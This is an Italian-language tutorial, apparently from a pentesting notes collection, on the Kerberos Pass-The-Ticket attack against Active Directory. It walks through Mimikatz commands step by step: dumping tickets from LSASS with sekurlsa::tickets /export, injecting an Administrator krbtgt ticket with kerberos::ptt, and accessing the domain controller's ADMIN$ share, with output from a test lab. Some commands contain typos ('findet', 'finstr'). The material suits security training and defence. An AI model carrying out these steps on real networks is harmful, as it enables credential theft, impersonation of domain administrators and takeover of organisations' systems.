# Pass-The-Ticket (PTT) Attack

Un attacco di tipo **Pass-The-Ticket** consiste nel rubare, ad un utente correttamente autenticato all'interno del sistema, il TGT (Ticket Granting Ticket) di Kerberos così da ottenere l'accesso ad un altro computer.

Nei sistemi Active Directory, il TGT fornisce una prova sull'autenticità dell'utente che sta effettuando una determinata richiesta.\
I Domain Controller ricevono la richiesta di accesso ad una risorsa e per permetterlo validano il TGT dell'utente richiedente.

Tramite tool come **Mimikatz** o **Rubeus**, un attaccante può ricavare questi ticket in quanto sono salvati all'interno del LSASS (Local Security Authority Subsystem) ed inviarli al TGS di Kerberos (Ticket Granting Service) per ottenere l'accesso a qualsiasi altra risorsa all'interno della rete.

**Note:** Questa tecnica è utilizzabile solo dopo che si è riusciti ad autenticarsi all'interno di una macchina tramite un precedente furto di credenziali valide (es. Phishing / Social Engineering).

## Pass-The-Ticket w\Mimikatz

<p align="center">
  <img src="https://ifconfig.dk/wp-content/uploads/2015/06/logo.png" />
</p>


I comandi che seguono effettueranno l'esportazione dei ticket di Kerberos all'interno della directory in cui `mimikatz.exe` è stato eseguito.\
I file che ci interessano sono quelli con estensione `.kirbi`.\
Poniamo molta attenzione ai ticket `krbtgt` in quanto permettono l'accesso a numerosi servizi.\
Un account KRBTGT è un account di Active Directory predefinito utilizzato dal KDC (Key Distribuition Center). Viene creato automaticamente durante la creazione di un nuovo dominio Active Directory.

**Note:** I ticket KRBTGT sono in cache all'interno della macchina solo se l'amministratore ha effettuato l'accesso precedentemente.

Andiamo ad eseguire `mimikatz`
```
> mimikatz.exe
```

Controlliamo se abbiamo i permessi necessari per poter continuare\
```
# privilege::debug
```
Se l'output è `Privilege '20' OK` allora possiamo proseguire.

Andiamo ad estrarre le password dal LSASS della macchina
```
# sekurlsa::tickets /export
```

Usciamo e verifichiamo di aver correttamente estratto i ticket
```
# exit
> dir | findet "Administrator" | findstr "krbtgt"

[...]
[0;1d0bb]-2-0-40e10000-Administrator@krbtgt-HACKED.TESTLAB.kirbi
[0;1d0bb]-2-1-60a10000-Administrator@krbtgt-HACKED.TESTLAB.kirbi
[0;47d2a]-2-0-40e10000-Administrator@krbtgt-HACKED.TESTLAB.kirbi
[...]
```

Possiamo ora riutilizzarne uno per impersonificare il Domain Admin

```
> mimikatz.exe
# privilege::debug
# kerberos::ptt [0;1d0bb]-2-0-40e10000-Administrator@krbtgt-HACKED.TESTLAB.kirbi

[...]
File: '[0;1d0bb]-2-0-40e10000-Administrator@krbtgt-HACKED.TESTLAB.kirbi': OK
[...]

# exit
```

Verifichiamo se all'interno della cache è presente il ticket
```
> klist | finstr "Cached"

Cached Tickets: (1)
```

Andiamo ora a verificare l'hostname del Domain Controller
```
> nltest /dc:HACKED.TESTLAB

[...]
win2021dc.HACKED.TESTLAB [PDC] [DS] Default-Site: Default-Site-Title
[...]
```

Digitiamo il seguente comando
```
> dir \\win2021dc.hacked.testlab\admin$
```

E abbiamo così accesso alla directory `ADMIN$`.
